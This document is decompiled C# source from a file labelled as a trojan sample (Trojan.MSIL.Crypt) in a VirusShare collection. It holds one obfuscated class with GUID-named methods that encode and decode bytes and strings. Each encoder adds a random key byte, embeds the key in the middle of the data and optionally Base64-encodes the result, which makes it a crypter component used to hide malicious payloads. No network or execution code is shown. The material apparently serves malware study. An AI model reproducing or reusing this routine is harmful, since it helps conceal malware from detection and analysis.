// Decompiled with JetBrains decompiler
// Type: {e0269030-1920-42bf-bcc9-cc40375bc38b}.{82ae5708-4754-4b76-af22-8a4f62c094a0}
// Assembly: Built, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 5BD05E0A-35FE-496C-B5CD-CE720A39B54F
// Assembly location: C:\Users\Administrateur\Desktop\Virusshare-00005-msil\Trojan.MSIL.Crypt.pfl-5d072f5224e528472e5a50d1ebed572aa86c2691d7aedaced148054ce65a49be.exe

using System;
using System.Collections.Generic;
using System.Text;

namespace \u007Be0269030\u002D1920\u002D42bf\u002Dbcc9\u002Dcc40375bc38b\u007D
{
  internal class \u007B82ae5708\u002D4754\u002D4b76\u002Daf22\u002D8a4f62c094a0\u007D
  {
    public static byte[] \u007B8cecc9d2\u002D562f\u002D4662\u002D9612\u002D122f79a5ed99\u007D(
      byte[] _param0,
      bool _param1)
    {
      try
      {
        int num = new Random().Next(-2000000000, 2000000000);
        for (int index = 0; index < _param0.Length; ++index)
          _param0[index] = (_param0[index] += (byte) num);
        List<byte> byteList = new List<byte>();
        byteList.AddRange((IEnumerable<byte>) _param0);
        byte[] bytes = BitConverter.GetBytes(num);
        byteList.InsertRange(byteList.Count / 2, (IEnumerable<byte>) bytes);
        byte[] array = byteList.ToArray();
        byteList.Clear();
        return _param1 ? Encoding.ASCII.GetBytes(Convert.ToBase64String(array)) : array;
      }
      catch
      {
      }
      return (byte[]) null;
    }

    public static byte[] \u007B037930f3\u002D3290\u002D45b0\u002Daac6\u002D01f31fa3de21\u007D(
      byte[] _param0,
      bool _param1)
    {
      try
      {
        List<byte> byteList1 = new List<byte>(_param1 ? (IEnumerable<byte>) Convert.FromBase64String(Encoding.ASCII.GetString(_param0)) : (IEnumerable<byte>) _param0);
        int int32 = BitConverter.ToInt32(byteList1.GetRange((byteList1.Count - 4) / 2, 4).ToArray(), 0);
        byteList1.RemoveRange((byteList1.Count - 4) / 2, 4);
        for (int index1 = 0; index1 < byteList1.Count; ++index1)
        {
          List<byte> byteList2;
          int index2;
          byteList1[index1] = (byteList2 = byteList1)[index2 = index1] = (byte) ((uint) byteList2[index2] - (uint) (byte) int32);
        }
        byte[] array = byteList1.ToArray();
        byteList1.Clear();
        return array;
      }
      catch
      {
      }
      return (byte[]) null;
    }

    public static string \u007B9ae08026\u002D24b9\u002D44bc\u002D81df\u002D838c13f89490\u007D(
      string _param0,
      bool _param1)
    {
      try
      {
        int num = new Random().Next(-2000000000, 2000000000);
        byte[] bytes1 = Encoding.GetEncoding(1252).GetBytes(_param0);
        for (int index = 0; index < bytes1.Length; ++index)
          bytes1[index] += (byte) num;
        List<byte> byteList = new List<byte>();
        byteList.AddRange((IEnumerable<byte>) bytes1);
        byte[] bytes2 = BitConverter.GetBytes(num);
        byteList.InsertRange(byteList.Count / 2, (IEnumerable<byte>) bytes2);
        byte[] array = byteList.ToArray();
        byteList.Clear();
        return _param1 ? Convert.ToBase64String(array) : Encoding.GetEncoding(1252).GetString(array);
      }
      catch
      {
      }
      return string.Empty;
    }

    public static string \u007B67fb42c0\u002Ddbf4\u002D48f9\u002D9980\u002De9f9b92dde81\u007D(
      string _param0,
      bool _param1)
    {
      try
      {
        List<byte> byteList1 = new List<byte>(_param1 ? (IEnumerable<byte>) Convert.FromBase64String(_param0) : (IEnumerable<byte>) Encoding.GetEncoding(1252).GetBytes(_param0));
        int int32 = BitConverter.ToInt32(byteList1.GetRange((byteList1.Count - 4) / 2, 4).ToArray(), 0);
        byteList1.RemoveRange((byteList1.Count - 4) / 2, 4);
        for (int index1 = 0; index1 < byteList1.Count; ++index1)
        {
          List<byte> byteList2;
          int index2;
          byteList1[index1] = (byteList2 = byteList1)[index2 = index1] = (byte) ((uint) byteList2[index2] - (uint) (byte) int32);
        }
        byte[] array = byteList1.ToArray();
        byteList1.Clear();
        return Encoding.GetEncoding(1252).GetString(array);
      }
      catch
      {
      }
      return string.Empty;
    }
  }
}
